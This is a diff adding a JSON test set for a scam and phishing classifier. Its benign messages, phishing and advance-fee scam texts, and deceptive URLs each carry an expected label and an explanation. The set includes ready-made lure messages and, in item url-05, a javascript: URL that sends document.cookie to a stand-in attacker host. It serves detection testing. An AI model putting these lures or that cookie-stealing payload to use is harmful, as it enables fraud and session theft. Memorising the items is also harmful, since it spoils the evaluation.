@@ -1,0 +1,183 @@
+[
+  {
+    "id": "benign-01",
+    "category": "benign_message",
+    "input": {
+      "message": "Hey Sarah, are we still meeting for lunch at 12:30pm today?"
+    },
+    "expected_label": "benign",
+    "explanation": "Ordinary informal personal conversation with no financial, credential, or urgency lures."
+  },
+  {
+    "id": "benign-02",
+    "category": "benign_message",
+    "input": {
+      "message": "Here is the project report we discussed yesterday in our sync meeting. Please review when you have time."
+    },
+    "expected_label": "benign",
+    "explanation": "Normal business collaboration without threats or credential harvesting."
+  },
+  {
+    "id": "benign-03",
+    "category": "benign_message",
+    "input": {
+      "message": "Happy birthday! Hope you have a wonderful day with family and friends."
+    },
+    "expected_label": "benign",
+    "explanation": "Standard personal greeting."
+  },
+  {
+    "id": "benign-04",
+    "category": "legitimate_url",
+    "input": {
+      "url": "https://www.paypal.com/signin"
+    },
+    "expected_label": "benign",
+    "explanation": "Legitimate primary domain for PayPal using HTTPS."
+  },
+  {
+    "id": "benign-05",
+    "category": "legitimate_url",
+    "input": {
+      "url": "https://developer.apple.com/documentation/swift"
+    },
+    "expected_label": "benign",
+    "explanation": "Legitimate developer subdomain on Apple official domain."
+  },
+  {
+    "id": "benign-06",
+    "category": "legitimate_url",
+    "input": {
+      "url": "https://support.google.com/mail/answer/7436150"
+    },
+    "expected_label": "benign",
+    "explanation": "Legitimate official Google support documentation page."
+  },
+  {
+    "id": "borderline-01",
+    "category": "borderline",
+    "input": {
+      "message": "Urgent: The production server CPU spiked to 98%. Please check the logs immediately."
+    },
+    "expected_label": "benign",
+    "explanation": "Technical alerting with urgency but no phishing or credential theft intention."
+  },
+  {
+    "id": "borderline-02",
+    "category": "borderline",
+    "input": {
+      "message": "Don't forget to submit your weekly timesheet before 5pm today."
+    },
+    "expected_label": "benign",
+    "explanation": "Internal routine reminder; does not request confidential credentials or funds."
+  },
+  {
+    "id": "borderline-03",
+    "category": "borderline",
+    "input": {
+      "message": "Mom says we need to leave within 24 hours if we want to beat the holiday traffic."
+    },
+    "expected_label": "benign",
+    "explanation": "Casual conversation that mentions a 24-hour timeframe in a benign personal context."
+  },
+  {
+    "id": "phish-01",
+    "category": "credential_harvesting",
+    "input": {
+      "message": "URGENT: Your account has been suspended! Verify your password and login credentials within 24 hours to restore access."
+    },
+    "expected_label": "scam",
+    "explanation": "Classic high-pressure credential harvesting threat with account suspension claim."
+  },
+  {
+    "id": "phish-02",
+    "category": "credential_harvesting",
+    "input": {
+      "message": "Security Alert: Someone attempted to access your Chase profile. Confirm your PIN and OTP immediately."
+    },
+    "expected_label": "scam",
+    "explanation": "Solicits confidential second-factor one-time passcode and PIN under urgent pretense."
+  },
+  {
+    "id": "phish-03",
+    "category": "credential_harvesting",
+    "input": {
+      "message": "Action Required: Update your login and billing credentials before your service is terminated."
+    },
+    "expected_label": "scam",
+    "explanation": "Forces credential updates under the threat of service termination."
+  },
+  {
+    "id": "scam-01",
+    "category": "financial_scam",
+    "input": {
+      "message": "Congratulations! You have won $10,000 in our international lottery. Wire transfer a $50 processing fee to claim your prize."
+    },
+    "expected_label": "scam",
+    "explanation": "Advance fee fraud promising lottery winnings in exchange for an upfront wire transfer."
+  },
+  {
+    "id": "scam-02",
+    "category": "financial_scam",
+    "input": {
+      "message": "IRS Final Notice: You have an unclaimed refund of $1,450. Buy a $100 gift card immediately to verify your identity."
+    },
+    "expected_label": "scam",
+    "explanation": "Impersonates tax authorities demanding non-traceable gift cards for a refund."
+  },
+  {
+    "id": "scam-03",
+    "category": "financial_scam",
+    "input": {
+      "message": "Exclusive crypto investment opportunity! Send 0.1 Bitcoin now and receive double returns within 12 hours."
+    },
+    "expected_label": "scam",
+    "explanation": "Crypto doubling scam with artificial urgency."
+  },
+  {
+    "id": "url-01",
+    "category": "deceptive_url",
+    "input": {
+      "url": "http://paypal-security-center.xyz/update-account"
+    },
+    "expected_label": "scam",
+    "explanation": "Unencrypted HTTP URL on a suspicious .xyz TLD spoofing PayPal in domain stem."
+  },
+  {
+    "id": "url-02",
+    "category": "deceptive_url",
+    "input": {
+      "url": "https://chase.com@attacker-controlled-server.com/login"
+    },
+    "expected_label": "scam",
+    "explanation": "Uses @ authority notation to disguise the true host as chase.com."
+  },
+  {
+    "id": "url-03",
+    "category": "deceptive_url",
+    "input": {
+      "url": "http://192.168.1.150/bank-verification"
+    },
+    "expected_label": "scam",
+    "explanation": "Direct raw numeric IP host used instead of legitimate registered domain."
+  },
+  {
+    "id": "url-04",
+    "category": "deceptive_url",
+    "input": {
+      "url": "https://bit.ly/secure-account-login"
+    },
+    "expected_label": "scam",
+    "explanation": "Obfuscated URL shortener used in sensitive security/account context."
+  },
+  {
+    "id": "url-05",
+    "category": "deceptive_url",
+    "input": {
+      "url": "javascript:fetch('https://evil.example/steal?c='+document.cookie)"
+    },
+    "expected_label": "scam",
+    "explanation": "Dangerous executable pseudo-protocol (javascript:) aimed at client execution."
+  }
+]
+
